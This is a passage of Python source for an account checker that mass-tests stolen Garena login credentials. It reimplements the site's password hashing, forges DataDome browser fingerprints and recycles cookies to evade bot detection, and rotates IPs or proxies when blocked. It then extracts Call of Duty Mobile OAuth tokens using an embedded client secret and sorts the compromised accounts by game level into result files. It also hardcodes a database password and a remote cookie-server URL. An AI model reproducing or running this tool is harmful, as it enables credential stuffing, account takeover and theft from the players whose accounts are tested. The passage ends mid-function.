            tbl.add_row("[bold magenta]── Games Found ──[/bold magenta]", "", "")
            for label, count in active_games:
                tbl.add_row(f"  {label}", f"[bright_magenta]{count}[/bright_magenta]", "")
        return Panel(tbl, title="[bold bright_cyan]LIVE STATS[/bold bright_cyan]", border_style="bright_cyan", padding=(0, 1))

    def display_final_stats(self):
        stats = self.get_stats()
        elapsed = time.time() - self.start_time
        total = self.total_accounts
        proc = self.get_processed_count()
        rate = (proc / elapsed) if elapsed > 0 else 0
        def bar(count, denom, color, w=20):
            if denom == 0:
                return f"[dim]{'░'*w}[/dim]"
            f2 = int((count / denom) * w)
            return f"[{color}]{'█'*f2}[/{color}][dim]{'░'*(w-f2)}[/dim]"
        main = Table(show_header=True, box=None, padding=(0, 2))
        main.add_column("Category", style="bold cyan", min_width=14, no_wrap=True)
        main.add_column("Count", justify="right", style="bold bright_white", min_width=7)
        main.add_column("Pct", justify="right", style="bold yellow", min_width=7)
        main.add_column("Visual", style="bright_white", min_width=22)
        def mr(label, count, denom, color):
            pct = (count / denom * 100) if denom > 0 else 0
            main.add_row(label, str(count), f"{pct:.1f}%", bar(count, denom, color))
        mr("Valid", stats["valid"], total, "green")
        mr("Invalid", stats["invalid"], total, "red")
        mr("Errors", stats["error"], total, "dim red")
        main.add_row("", "", "", "")
        mr("Clean", stats["clean"], max(stats["valid"],1), "bright_green")
        mr("Not Clean", stats["not_clean"], max(stats["valid"],1), "yellow")
        mr("Has CODM", stats["has_codm"], max(stats["valid"],1), "bright_cyan")
        mr("No CODM", stats["no_codm"], max(stats["valid"],1), "magenta")
        info = Table(show_header=False, box=None, padding=(0, 2))
        info.add_column(style="bold cyan", min_width=20, no_wrap=True)
        info.add_column(style="bold bright_white", min_width=16, no_wrap=True)
        info.add_row("Total Time", f"{int(elapsed//60)}m {int(elapsed%60)}s")
        info.add_row("Rate", f"{rate:.2f} acc/s")
        info.add_row("Processed", f"{proc}/{total}")
        info.add_row("Top Clean Level", f"[bright_green]{stats['highest_clean_level']}[/bright_green]")
        info.add_row("Top Not Clean Level", f"[yellow]{self.highest_nc_level}[/yellow]")
        gc = self.game_counts
        game_tbl = Table(show_header=True, box=None, padding=(0, 2))
        game_tbl.add_column("Game", style="bold cyan", min_width=18, no_wrap=True)
        game_tbl.add_column("Found", justify="right", style="bold bright_white", min_width=8)
        for key, label in GAME_DISPLAY_NAMES:
            count = gc.get(key, 0)
            color = "bright_cyan" if count > 0 else "dim"
            game_tbl.add_row(label, f"[{color}]{count}[/{color}]")
        clean_lvl = stats["clean_level_counts"]
        nc_lvl = stats["not_clean_level_counts"]
        clean_total = max(stats["clean"], 1)
        nc_total = max(stats["not_clean"], 1)
        lvl_tbl = Table(show_header=True, box=None, padding=(0, 2))
        lvl_tbl.add_column("Range", style="bold cyan", min_width=16, no_wrap=True)
        lvl_tbl.add_column("Clean", justify="right", style="bold bright_green", min_width=8)
        lvl_tbl.add_column("", style="bright_green", min_width=16)
        lvl_tbl.add_column("NC", justify="right", style="bold yellow", min_width=8)
        lvl_tbl.add_column("", style="yellow", min_width=16)
        for rng in ["351-400", "201-350", "101-200", "1-100"]:
            cc = clean_lvl.get(rng, 0)
            nc = nc_lvl.get(rng, 0)
            lvl_tbl.add_row(f"Lv {rng}", str(cc), bar(cc, clean_total, "bright_green", 14), str(nc), bar(nc, nc_total, "yellow", 14))
        console.print("\n")
        console.print(Panel(Group(main, info, lvl_tbl, game_tbl), title="[bold bright_cyan]FINAL RESULTS[/bold bright_cyan]", border_style="bright_cyan", padding=(0, 1)))
        console.print("[dim]  Powered by @rrielqt[/dim]\n")

class ResultsManager:
    def __init__(self):
        self.results_dir = Path("Results")
        self.results_dir.mkdir(exist_ok=True)
        self.valid_file = self.results_dir / "Valid.txt"
        self.no_codm_file = self.results_dir / "No_codm.txt"
        self.level_files = {
            (1,50):   self.results_dir / "001-050_level.txt",
            (51,100): self.results_dir / "050-100_level.txt",
            (101,150): self.results_dir / "100-150_level.txt",
            (151,200): self.results_dir / "150-200_level.txt",
            (201,250): self.results_dir / "200-250_level.txt",
            (251,300): self.results_dir / "250-300_level.txt",
            (301,350): self.results_dir / "300-350_level.txt",
            (351,400): self.results_dir / "350-400_level.txt",
        }
        self.lock = threading.Lock()

    def _get_level_range(self, level):
        if 1 <= level <= 50: return (1,50)
        elif 51 <= level <= 100: return (51,100)
        elif 101 <= level <= 150: return (101,150)
        elif 151 <= level <= 200: return (151,200)
        elif 201 <= level <= 250: return (201,250)
        elif 251 <= level <= 300: return (251,300)
        elif 301 <= level <= 350: return (301,350)
        elif 351 <= level <= 400: return (351,400)
        return None

    def add_account(self, account_data):
        if account_data.get('is_error'):
            return
        has_codm = account_data.get('has_codm', False)
        content = account_data.get('plain_output', '')
        if not content:
            return
        sep = "=" * 60
        with self.lock:
            if has_codm:
                with open(self.valid_file, 'a', encoding='utf-8') as f:
                    f.write(content + "\n" + sep + "\n\n")
                level = account_data.get('codm_level', 0)
                if level:
                    rng = self._get_level_range(level)
                    if rng:
                        lf = self.level_files[rng]
                        with open(lf, 'a', encoding='utf-8') as f:
                            f.write(content + "\n" + sep + "\n\n")
            else:
                with open(self.no_codm_file, 'a', encoding='utf-8') as f:
                    f.write(content + "\n" + sep + "\n\n")

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if not item:
            continue
        if "=" in item:
            try:
                key, value = item.split("=", 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

SERVER_COOKIE_URL = "https://legitdax.cloud/TAJICOOKIES/fresh_cookies.txt"
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
COOKIE_FILE = os.path.join(_SCRIPT_DIR_COOKIE, 'fresh_cookie.txt')
_TG_HOOK = None
DB_URL = "postgresql://postgres:CiIBvyjaJJYLkKCqYgPOONEuGxunMFfX@tramway.proxy.rlwy.net:30778/railway"

def _db_fetch_cookies():
    return []

def _db_ban_cookie(cookie_line):
    pass

COOKIE_SOURCE = "file"

def prompt_cookie_source():
    global COOKIE_SOURCE
    COOKIE_SOURCE = "file"
    for fname in ("fresh_cookie.txt", "fresh_cookies.txt"):
        if os.path.exists(fname):
            console.print(f"  [{THEME_SUCCESS}]Cookie file found: [dim]{fname}[/dim]")
            return
    console.print(f"  [{THEME_WARNING}]No cookie file found in current directory.[/]")
    console.print(f"  [dim]Place fresh_cookie.txt alongside the script and re-run.[/]")

class CookieManager:
    def __init__(self, server_url=None):
        self.banned_cookies = set()
        self.server_url = server_url
        self.banned_cookie_file = 'banned_cookies.txt'
        self._lock = threading.Lock()
        self.load_banned_cookies()

    def load_banned_cookies(self):
        if os.path.exists(self.banned_cookie_file):
            with open(self.banned_cookie_file, 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie):
        with self._lock:
            self.banned_cookies.add(cookie)
            with open(self.banned_cookie_file, 'a') as f:
                f.write(cookie + '\n')
            _db_ban_cookie(cookie)

    def get_valid_cookies(self):
        valid = []
        if COOKIE_SOURCE in ("file", "both"):
            for fname in (COOKIE_FILE, 'fresh_cookies.txt'):
                if os.path.exists(fname):
                    with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                        file_cookies = [c.strip() for c in f.read().splitlines() if c.strip() and 'datadome=' in c.strip() and not self.is_banned(c.strip())]
                    valid.extend(file_cookies)
                    break
        if COOKIE_SOURCE in ("db", "both"):
            db_cookies = _db_fetch_cookies()
            seen = set(valid)
            for c in db_cookies:
                if c not in seen and not self.is_banned(c):
                    valid.append(c)
                    seen.add(c)
        random.shuffle(valid)
        return valid

    def get_valid_cookie(self):
        cookies = self.get_valid_cookies()
        return random.choice(cookies) if cookies else None

    def save_cookie(self, datadome_value):
        formatted = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted):
            existing = set()
            if os.path.exists(COOKIE_FILE):
                with open(COOKIE_FILE, 'r') as f:
                    existing = set(line.strip() for line in f if line.strip())
            if formatted not in existing:
                with open(COOKIE_FILE, 'a') as f:
                    f.write(formatted + '\n')
                return True
        return False

    def refresh_cache(self):
        if self.server_url:
            return []
        else:
            return []

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        proxies = get_proxy_dict()
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8, proxies=proxies)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=600):
        global _ip_wait_active, _ip_changed, _ip_wait_generation
        if _proxy_active():
            return True
        with _ip_wait_lock:
            if _ip_wait_active:
                my_generation = _ip_wait_generation
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_generation += 1
                my_generation = _ip_wait_generation
                _ip_changed.clear()
                is_primary = True
        if not is_primary:
            deadline = time.time() + max_wait_time
            while time.time() < deadline:
                remaining = max(0.0, deadline - time.time())
                _ip_changed.wait(timeout=min(remaining, 15))
                with _ip_wait_lock:
                    current_gen = _ip_wait_generation
                    still_active = _ip_wait_active
                if current_gen != my_generation:
                    _ip_changed.clear()
                    continue
                if not still_active:
                    return True
            return False
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                console.print("[yellow]⚠️  Could not determine current IP, waiting 10 seconds[/yellow]")
                time.sleep(10)
                return True
            start_time = time.time()
            while time.time() - start_time < max_wait_time:
                time.sleep(check_interval)
                current_ip = self.get_current_ip()
                if current_ip and current_ip != original_ip:
                    return True
            return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_changed.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if _proxy_active():
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                return True
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    return True
                else:
                    return False
            else:
                return False
        return False

def get_datadome_cookie(session=None):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    _use_own_scraper = session is None
    for attempt in range(retries):
        try:
            if _use_own_scraper:
                scraper = cloudscraper.create_scraper()
            else:
                scraper = session
            response = scraper.post(url, headers=headers, data=data)
            response.raise_for_status()
            try:
                response_json = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                return None
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                if '=' in cookie_string and ';' in cookie_string:
                    datadome = cookie_string.split(';')[0].split('=')[1]
                else:
                    datadome = cookie_string
                return datadome
            else:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
        except Exception:
            if attempt < retries - 1:
                time.sleep(1)
    return None

def prelogin(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    retry_403 = 0
    retry_general = 0
    retry_total = 0
    MAX_TOTAL = 5
    while retry_total < MAX_TOTAL:
        retry_total += 1
        try:
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=12)
            new_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except:
                            pass
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except:
                pass
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            new_datadome = new_cookies.get('datadome')
            if response.status_code == 403:
                retry_403 += 1
                if new_cookies and retry_403 <= 1:
                    continue
                elif retry_403 <= 2:
                    fresh_datadome = get_datadome_cookie(session)
                    if fresh_datadome:
                        datadome_manager.set_datadome(fresh_datadome)
                        datadome_manager.set_session_datadome(session, fresh_datadome)
                        time.sleep(0.5)
                        continue
                    else:
                        time.sleep(0.5)
                        continue
                else:
                    if _proxy_active():
                        fresh_datadome = get_datadome_cookie(session)
                        if fresh_datadome:
                            datadome_manager.set_datadome(fresh_datadome)
                            datadome_manager.set_session_datadome(session, fresh_datadome)
                        retry_403 = 0
                        datadome_manager._403_attempts = 0
                        time.sleep(0.5)
                        continue
                    if datadome_manager.wait_for_ip_change(session):
                        fresh_datadome = get_datadome_cookie(session)
                        if fresh_datadome:
                            datadome_manager.set_datadome(fresh_datadome)
                            datadome_manager.set_session_datadome(session, fresh_datadome)
                            retry_403 = 0
                            datadome_manager._403_attempts = 0
                            time.sleep(0.5)
                            continue
                        else:
                            time.sleep(0.5)
                            continue
                    else:
                        time.sleep(0.5)
                        continue
            response.raise_for_status()
            try:
                data = response.json()
            except json.JSONDecodeError:
                retry_general += 1
                if retry_general < 3:
                    console.print(f"[yellow]⚠️  Invalid JSON response, retrying... ({retry_general}/3)[/yellow]")
                    time.sleep(2)
                    continue
                else:
                    console.print(f"[red]❌ Invalid response after 3 attempts[/red]")
                    return None, None, new_datadome
            if 'error' in data:
                return None, None, new_datadome
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return None, None, new_datadome
            return v1, v2, new_datadome
        except requests.exceptions.ProxyError:
            raise
        except requests.exceptions.ConnectionError:
            console.print(f"[yellow]⚠️  Connection error, retrying in 5s...[/yellow]")
            time.sleep(5)
            continue
        except requests.exceptions.Timeout:
            console.print(f"[yellow]⚠️  Timeout error, retrying in 5s...[/yellow]")
            time.sleep(5)
            continue
        except Exception:
            time.sleep(0.5)
            continue
    return None, None, None

def login(session, account, password, v1, v2, max_retries=2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    for retry in range(max_retries):
        try:
            params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=12)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except:
                            pass
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except:
                pass
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if retry < max_retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    return None
                elif 'captcha' in error_msg.lower():
                    time.sleep(0.5)
                    continue
            return sso_key
        except requests.exceptions.ProxyError:
            if retry < max_retries - 1:
                time.sleep(0.5)
                continue
            raise
        except requests.exceptions.ConnectionError:
            if retry < max_retries - 1:
                console.print(f"[yellow]⚠️  Connection error during login, retrying... ({retry + 1}/{max_retries})[/yellow]")
                time.sleep(0.5)
                continue
            raise
        except requests.exceptions.Timeout:
            if retry < max_retries - 1:
                console.print(f"[yellow]⚠️  Timeout during login, retrying... ({retry + 1}/{max_retries})[/yellow]")
                time.sleep(0.5)
                continue
        except requests.RequestException:
            if retry < max_retries - 1:
                time.sleep(0.5)
                continue
    return None

def _generate_device_id():
    import uuid
    return f"02-{uuid.uuid4()}"

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = "https://100082.connect.garena.com/oauth/token/grant"
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f"{name}={current_cookies[name]}")
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {
                "Host": "100082.connect.garena.com",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)",
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": "https://100082.connect.garena.com",
                "X-Requested-With": "com.garena.game.codm",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            if cookie_header:
                grant_headers["Cookie"] = cookie_header
            grant_body = f"client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}"
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get("code", "")
            if not code:
                logger.error(f"[ERROR] token/grant returned no code: {data}")
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * (2 ** attempt)
                time.sleep(delay)
                continue
            else:
                logger.error(f"[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts")
                raise
        except Exception:
            logger.error(f"[ERROR] Error in get_codm_grant_code (token/grant)")
            return ""
    return ""

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = get_proxy_dict()
    CLIENT_ID = "100082"
    CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
    REDIRECT_URI = "gop100082://auth/"
    exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"
    exchange_headers = {
        "User-Agent": "GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "100082.connect.garena.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }
    exchange_body = f"grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}"
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get("access_token", "")
            if not access_token:
                logger.error(f"[ERROR] token/exchange returned no access_token: {data}")
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * (2 ** attempt)
                time.sleep(delay)
                continue
            else:
                logger.error(f"[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts")
                raise
        except Exception:
            logger.error(f"[ERROR] Error in token_exchange (token/exchange)")
            return ""
    return ""

def get_codm_access_token(session):
    code = get_codm_grant_code(session)
    if not code:
        logger.error("[ERROR] get_codm_access_token: failed at token/grant step")
        return ""
    session_proxies = dict(session.proxies) if session.proxies else get_proxy_dict()
    access_token = token_exchange(code, proxies=session_proxies)
    if not access_token:
        logger.error("[ERROR] get_codm_access_token: failed at token/exchange step")
        return ""
    return access_token

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request-aos.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        session.get(codm_callback_url, headers=callback_headers, allow_redirects=False, timeout=12)
        api_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request-aos.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False, timeout=12)
        location = api_callback_response.headers.get("Location", "")
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
    except Exception:
